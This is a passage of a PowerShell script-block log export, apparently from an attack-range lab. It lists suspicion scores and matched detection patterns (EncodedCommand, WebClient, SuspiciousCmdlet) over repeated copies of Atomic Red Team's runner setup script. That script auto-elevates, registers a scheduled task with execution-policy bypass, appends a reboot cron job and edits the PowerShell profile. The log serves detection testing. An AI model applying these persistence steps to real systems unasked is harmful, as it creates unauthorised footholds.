                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:54 PM","35710567","8",", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword","SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","10264","function Invoke-SetupAtomicRunner {

    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $SkipServiceSetup,

        [Parameter(Mandatory = $false)]
        [switch]
        $asScheduledtask
    )

    # ensure running with admin privs
    if ($artConfig.OS -eq ""windows"") {
        # auto-elevate on Windows
        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($testadmin -eq $false) {
            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file ""{0}"" -elevated' -f ($myinvocation.MyCommand.Definition))
            exit $LASTEXITCODE
        }
    }
    else {
        # linux and macos check - doesn't auto-elevate
        if ((id -u) -ne 0 ) {
            Throw ""You must run the Invoke-SetupAtomicRunner script as root""
            exit
        }
    }

    if ($artConfig.basehostname.length -gt 15) { Throw ""The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer."" }

    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore

    if ($artConfig.OS -eq ""windows"") {
        if ($asScheduledtask) {
            if (Test-Path $artConfig.credFile) {
                Write-Host ""Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.""
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)
            }
            else {
                # create credential file for the user since we aren't using a group managed service account
                $cred = Get-Credential -UserName $artConfig.user -message ""Enter password for $($artConfig.user) in order to create the runner scheduled task""
                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile
            }
            # setup scheduled task that will start the runner after each restart
            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled
            $taskName = ""KickOff-AtomicRunner""
            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore
            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails
            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user
            $taskAction = New-ScheduledTaskAction -Execute ""powershell.exe"" -Argument ""-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force""
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user
            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays
            $triggers = @()
            foreach ($delay in $delays) {
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $trigger.Delay = ""PT$delay`M""
                $triggers += $trigger
            }
            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description ""A task that runs 1 minute or later after boot to start the atomic test runner script""
            try {
                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop
            }
            catch {
                if ($_.CategoryInfo.Category -eq ""AuthenticationError"") {
                    # remove the credential file if the password didn't work
                    Write-Error ""The credentials you entered are incorrect. Please run the setup script again and double check the username and password.""
                    Remove-Item $artConfig.credFile
                }
                else {
                    Throw $_
                }
            }

            # remove the atomicrunnerservice now that we are using a scheduled task instead
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
        }
        elseif (-not $SkipServiceSetup) {
            # create the service that will start the runner after each restart
            # The user must have the ""Log on as a service"" right. To add that right, open the Local Security Policy management console, go to the
            # ""\Security Settings\Local Policies\User Rights Assignments"" folder, and edit the ""Log on as a service"" policy there.
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup
            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir
            # set service start retry options
            $ServiceDisplayName = ""AtomicRunnerService""
            $action1, $action2, $action3 = ""restart""
            $time1 = 600000 # 10 minutes in miliseconds
            $action2 = ""restart""
            $time2 = 600000 # 10 minutes in miliseconds
            $actionLast = ""restart""
            $timeLast = 3600000 # 1 hour in miliseconds
            $resetCounter = 86400 # 1 day in seconds
            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }
            $action = $action1 + ""/"" + $time1 + ""/"" + $action2 + ""/"" + $time2 + ""/"" + $actionLast + ""/"" + $timeLast
            foreach ($service in $services) {
                # https://technet.microsoft.com/en-us/library/cc742019.aspx
                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter
            }
            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name Start -Value 2
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name DelayedAutostart -Value 1

            # remove scheduled task now that we are using a service instead
            Unregister-ScheduledTask ""KickOff-AtomicRunner"" -confirm:$false -ErrorAction Ignore
        }
    }
    else {
        # sets cronjob string using basepath from config.ps1
        $pwshPath = which pwsh
        $job = ""@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner""
        $exists = cat /etc/crontab | Select-String -Quiet ""KickoffAtomicRunner""
        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.
        if ($null -eq $exists) {
            $(Write-Output ""$job"" >> /etc/crontab)
            write-host ""setting cronjob""
        }
        else {
            write-host ""cronjob already exists""
        }
    }

    # Add Import-Module statement to the PowerShell profile
    $root = Split-Path $PSScriptRoot -Parent
    $pathToPSD1 = Join-Path $root ""Invoke-AtomicRedTeam.psd1""
    $importStatement = ""Import-Module """"$pathToPSD1"""" -Force""
    $profileFolder = Split-Path $profile
    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null
    New-Item $PROFILE -ErrorAction Ignore
    $profileContent = Get-Content $profile
    $line = $profileContent | Select-String "".*import-module.*invoke-atomicredTeam.psd1"" | Select-Object -ExpandProperty Line
    if ($line) {
        $profileContent | ForEach-Object { $_.replace( $line, ""$importStatement"") } | Set-Content $profile
    }
    else {
        Add-Content $profile $importStatement
    }

    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed
    if ((-not (Get-Module -ListAvailable ""Posh-SYSLOG"")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        write-verbose ""Posh-SYSLOG""
        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force
    }

    # create the CSV schedule of atomics to run if it doesn't exist
    if (-not (Test-Path $artConfig.scheduleFile)) {
        Invoke-GenerateNewSchedule
    }

    $schedule = Get-Schedule
    if ($null -eq $schedule) {
        Write-Host -ForegroundColor Yellow ""There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)""
        Write-Host -ForegroundColor Yellow ""Rerun this setup script after updating the schedule""
    }
    else {
        # Get the prereqs for all of the tests on the schedule
        Invoke-AtomicRunner -GetPrereqs
    }
}

# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9
function Add-EnvPath {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Path,

        [ValidateSet('Machine', 'User', 'Session')]
        [string] $Container = 'Session'
    )

    if ($Container -ne 'Session') {
        $containerMapping = @{
            Machine = [EnvironmentVariableTarget]::Machine
            User    = [EnvironmentVariableTarget]::User
        }
        $containerType = $containerMapping[$Container]

        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'
        if ($persistedPaths -notcontains $Path) {
            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }
            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)
        }
    }

    $envPaths = $env:Path -split ';'
    if ($envPaths -notcontains $Path) {
        $envPaths = $envPaths + $Path | Where-Object { $_ }
        $env:Path = $envPaths -join ';'
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:56 PM","35710897","8",", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword","SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","10264","function Invoke-SetupAtomicRunner {

    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $SkipServiceSetup,

        [Parameter(Mandatory = $false)]
        [switch]
        $asScheduledtask
    )

    # ensure running with admin privs
    if ($artConfig.OS -eq ""windows"") {
        # auto-elevate on Windows
        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($testadmin -eq $false) {
            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file ""{0}"" -elevated' -f ($myinvocation.MyCommand.Definition))
            exit $LASTEXITCODE
        }
    }
    else {
        # linux and macos check - doesn't auto-elevate
        if ((id -u) -ne 0 ) {
            Throw ""You must run the Invoke-SetupAtomicRunner script as root""
            exit
        }
    }

    if ($artConfig.basehostname.length -gt 15) { Throw ""The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer."" }

    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore

    if ($artConfig.OS -eq ""windows"") {
        if ($asScheduledtask) {
            if (Test-Path $artConfig.credFile) {
                Write-Host ""Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.""
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)
            }
            else {
                # create credential file for the user since we aren't using a group managed service account
                $cred = Get-Credential -UserName $artConfig.user -message ""Enter password for $($artConfig.user) in order to create the runner scheduled task""
                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile
            }
            # setup scheduled task that will start the runner after each restart
            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled
            $taskName = ""KickOff-AtomicRunner""
            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore
            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails
            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user
            $taskAction = New-ScheduledTaskAction -Execute ""powershell.exe"" -Argument ""-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force""
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user
            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays
            $triggers = @()
            foreach ($delay in $delays) {
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $trigger.Delay = ""PT$delay`M""
                $triggers += $trigger
            }
            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description ""A task that runs 1 minute or later after boot to start the atomic test runner script""
            try {
                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop
            }
            catch {
                if ($_.CategoryInfo.Category -eq ""AuthenticationError"") {
                    # remove the credential file if the password didn't work
                    Write-Error ""The credentials you entered are incorrect. Please run the setup script again and double check the username and password.""
                    Remove-Item $artConfig.credFile
                }
                else {
                    Throw $_
                }
            }

            # remove the atomicrunnerservice now that we are using a scheduled task instead
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
        }
        elseif (-not $SkipServiceSetup) {
            # create the service that will start the runner after each restart
            # The user must have the ""Log on as a service"" right. To add that right, open the Local Security Policy management console, go to the
            # ""\Security Settings\Local Policies\User Rights Assignments"" folder, and edit the ""Log on as a service"" policy there.
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup
            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir
            # set service start retry options
            $ServiceDisplayName = ""AtomicRunnerService""
            $action1, $action2, $action3 = ""restart""
            $time1 = 600000 # 10 minutes in miliseconds
            $action2 = ""restart""
            $time2 = 600000 # 10 minutes in miliseconds
            $actionLast = ""restart""
            $timeLast = 3600000 # 1 hour in miliseconds
            $resetCounter = 86400 # 1 day in seconds
            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }
            $action = $action1 + ""/"" + $time1 + ""/"" + $action2 + ""/"" + $time2 + ""/"" + $actionLast + ""/"" + $timeLast
            foreach ($service in $services) {
                # https://technet.microsoft.com/en-us/library/cc742019.aspx
                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter
            }
            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name Start -Value 2
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name DelayedAutostart -Value 1

            # remove scheduled task now that we are using a service instead
            Unregister-ScheduledTask ""KickOff-AtomicRunner"" -confirm:$false -ErrorAction Ignore
        }
    }
    else {
        # sets cronjob string using basepath from config.ps1
        $pwshPath = which pwsh
        $job = ""@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner""
        $exists = cat /etc/crontab | Select-String -Quiet ""KickoffAtomicRunner""
        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.
        if ($null -eq $exists) {
            $(Write-Output ""$job"" >> /etc/crontab)
            write-host ""setting cronjob""
        }
        else {
            write-host ""cronjob already exists""
        }
    }

    # Add Import-Module statement to the PowerShell profile
    $root = Split-Path $PSScriptRoot -Parent
    $pathToPSD1 = Join-Path $root ""Invoke-AtomicRedTeam.psd1""
    $importStatement = ""Import-Module """"$pathToPSD1"""" -Force""
    $profileFolder = Split-Path $profile
    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null
    New-Item $PROFILE -ErrorAction Ignore
    $profileContent = Get-Content $profile
    $line = $profileContent | Select-String "".*import-module.*invoke-atomicredTeam.psd1"" | Select-Object -ExpandProperty Line
    if ($line) {
        $profileContent | ForEach-Object { $_.replace( $line, ""$importStatement"") } | Set-Content $profile
    }
    else {
        Add-Content $profile $importStatement
    }

    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed
    if ((-not (Get-Module -ListAvailable ""Posh-SYSLOG"")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        write-verbose ""Posh-SYSLOG""
        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force
    }

    # create the CSV schedule of atomics to run if it doesn't exist
    if (-not (Test-Path $artConfig.scheduleFile)) {
        Invoke-GenerateNewSchedule
    }

    $schedule = Get-Schedule
    if ($null -eq $schedule) {
        Write-Host -ForegroundColor Yellow ""There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)""
        Write-Host -ForegroundColor Yellow ""Rerun this setup script after updating the schedule""
    }
    else {
        # Get the prereqs for all of the tests on the schedule
        Invoke-AtomicRunner -GetPrereqs
    }
}

# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9
function Add-EnvPath {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Path,

        [ValidateSet('Machine', 'User', 'Session')]
        [string] $Container = 'Session'
    )

    if ($Container -ne 'Session') {
        $containerMapping = @{
            Machine = [EnvironmentVariableTarget]::Machine
            User    = [EnvironmentVariableTarget]::User
        }
        $containerType = $containerMapping[$Container]

        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'
        if ($persistedPaths -notcontains $Path) {
            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }
            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)
        }
    }

    $envPaths = $env:Path -split ';'
    if ($envPaths -notcontains $Path) {
        $envPaths = $envPaths + $Path | Where-Object { $_ }
        $env:Path = $envPaths -join ';'
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:55 PM","35710706","8",", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword","SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","10264","function Invoke-SetupAtomicRunner {

    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $SkipServiceSetup,

        [Parameter(Mandatory = $false)]
        [switch]
        $asScheduledtask
    )

    # ensure running with admin privs
    if ($artConfig.OS -eq ""windows"") {
        # auto-elevate on Windows
        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($testadmin -eq $false) {
            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file ""{0}"" -elevated' -f ($myinvocation.MyCommand.Definition))
            exit $LASTEXITCODE
        }
    }
    else {
        # linux and macos check - doesn't auto-elevate
        if ((id -u) -ne 0 ) {
            Throw ""You must run the Invoke-SetupAtomicRunner script as root""
            exit
        }
    }

    if ($artConfig.basehostname.length -gt 15) { Throw ""The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer."" }

    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore

    if ($artConfig.OS -eq ""windows"") {
        if ($asScheduledtask) {
            if (Test-Path $artConfig.credFile) {
                Write-Host ""Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.""
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)
            }
            else {
                # create credential file for the user since we aren't using a group managed service account
                $cred = Get-Credential -UserName $artConfig.user -message ""Enter password for $($artConfig.user) in order to create the runner scheduled task""
                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile
            }
            # setup scheduled task that will start the runner after each restart
            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled
            $taskName = ""KickOff-AtomicRunner""
            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore
            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails
            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user
            $taskAction = New-ScheduledTaskAction -Execute ""powershell.exe"" -Argument ""-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force""
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user
            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays
            $triggers = @()
            foreach ($delay in $delays) {
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $trigger.Delay = ""PT$delay`M""
                $triggers += $trigger
            }
            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description ""A task that runs 1 minute or later after boot to start the atomic test runner script""
            try {
                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop
            }
            catch {
                if ($_.CategoryInfo.Category -eq ""AuthenticationError"") {
                    # remove the credential file if the password didn't work
                    Write-Error ""The credentials you entered are incorrect. Please run the setup script again and double check the username and password.""
                    Remove-Item $artConfig.credFile
                }
                else {
                    Throw $_
                }
            }

            # remove the atomicrunnerservice now that we are using a scheduled task instead
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
        }
        elseif (-not $SkipServiceSetup) {
            # create the service that will start the runner after each restart
            # The user must have the ""Log on as a service"" right. To add that right, open the Local Security Policy management console, go to the
            # ""\Security Settings\Local Policies\User Rights Assignments"" folder, and edit the ""Log on as a service"" policy there.
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup
            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir
            # set service start retry options
            $ServiceDisplayName = ""AtomicRunnerService""
            $action1, $action2, $action3 = ""restart""
            $time1 = 600000 # 10 minutes in miliseconds
            $action2 = ""restart""
            $time2 = 600000 # 10 minutes in miliseconds
            $actionLast = ""restart""
            $timeLast = 3600000 # 1 hour in miliseconds
            $resetCounter = 86400 # 1 day in seconds
            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }
            $action = $action1 + ""/"" + $time1 + ""/"" + $action2 + ""/"" + $time2 + ""/"" + $actionLast + ""/"" + $timeLast
            foreach ($service in $services) {
                # https://technet.microsoft.com/en-us/library/cc742019.aspx
                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter
            }
            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name Start -Value 2
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name DelayedAutostart -Value 1

            # remove scheduled task now that we are using a service instead
            Unregister-ScheduledTask ""KickOff-AtomicRunner"" -confirm:$false -ErrorAction Ignore
        }
    }
    else {
        # sets cronjob string using basepath from config.ps1
        $pwshPath = which pwsh
        $job = ""@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner""
        $exists = cat /etc/crontab | Select-String -Quiet ""KickoffAtomicRunner""
        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.
        if ($null -eq $exists) {
            $(Write-Output ""$job"" >> /etc/crontab)
            write-host ""setting cronjob""
        }
        else {
            write-host ""cronjob already exists""
        }
    }

    # Add Import-Module statement to the PowerShell profile
    $root = Split-Path $PSScriptRoot -Parent
    $pathToPSD1 = Join-Path $root ""Invoke-AtomicRedTeam.psd1""
    $importStatement = ""Import-Module """"$pathToPSD1"""" -Force""
    $profileFolder = Split-Path $profile
    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null
    New-Item $PROFILE -ErrorAction Ignore
    $profileContent = Get-Content $profile
    $line = $profileContent | Select-String "".*import-module.*invoke-atomicredTeam.psd1"" | Select-Object -ExpandProperty Line
    if ($line) {
        $profileContent | ForEach-Object { $_.replace( $line, ""$importStatement"") } | Set-Content $profile
    }
    else {
        Add-Content $profile $importStatement
    }

    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed
    if ((-not (Get-Module -ListAvailable ""Posh-SYSLOG"")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        write-verbose ""Posh-SYSLOG""
        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force
    }

    # create the CSV schedule of atomics to run if it doesn't exist
    if (-not (Test-Path $artConfig.scheduleFile)) {
        Invoke-GenerateNewSchedule
    }

    $schedule = Get-Schedule
    if ($null -eq $schedule) {
        Write-Host -ForegroundColor Yellow ""There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)""
        Write-Host -ForegroundColor Yellow ""Rerun this setup script after updating the schedule""
    }
    else {
        # Get the prereqs for all of the tests on the schedule
        Invoke-AtomicRunner -GetPrereqs
    }
}

# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9
function Add-EnvPath {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Path,

        [ValidateSet('Machine', 'User', 'Session')]
        [string] $Container = 'Session'
    )

    if ($Container -ne 'Session') {
        $containerMapping = @{
            Machine = [EnvironmentVariableTarget]::Machine
            User    = [EnvironmentVariableTarget]::User
        }
        $containerType = $containerMapping[$Container]

        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'
        if ($persistedPaths -notcontains $Path) {
            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }
            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)
        }
    }

    $envPaths = $env:Path -split ';'
    if ($envPaths -notcontains $Path) {
        $envPaths = $envPaths + $Path | Where-Object { $_ }
        $env:Path = $envPaths -join ';'
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:57 PM","35711085","8",", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword","SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","10264","function Invoke-SetupAtomicRunner {

    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $SkipServiceSetup,

